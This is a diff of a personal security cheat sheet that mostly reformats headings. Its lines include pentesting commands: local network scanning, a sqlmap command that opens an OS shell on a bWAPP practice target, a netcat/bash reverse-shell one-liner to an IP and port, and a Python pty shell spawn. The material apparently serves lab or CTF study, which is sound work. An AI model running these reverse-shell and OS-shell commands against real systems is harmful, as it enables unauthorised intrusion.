@@ -2,15 +2,12 @@
 My InfoSec Cheat sheet and stuff
 
 
-------
-scan local network
------
+
+# scan local network
 
 arp-scan --local
 
-------
-
-sqlmap 
+# sqlmap 
 
 ------
 
@@ -42,7 +39,7 @@ sqlmap --url="http://bee-box/bWAPP/sqli_1.php?title=iron" -D bWAPP --os-shell
 
 ----------
 
-nc shell
+# nc shell
 
 ----------
 
@@ -52,14 +49,14 @@ nc -nv -e /bin/bash IP PORT  OR  bash -c "bash -i >& /dev/tcp/10.10.15.94/443 0>
 
 
 ---
-
+# photos and metadata
 exif 
 exiftool 
 steghide info
 
 
 ---
-SPAWN PY SHELL
+# SPAWN PY SHELL
 
 import pty
 pty.spawn("/bin/sh")
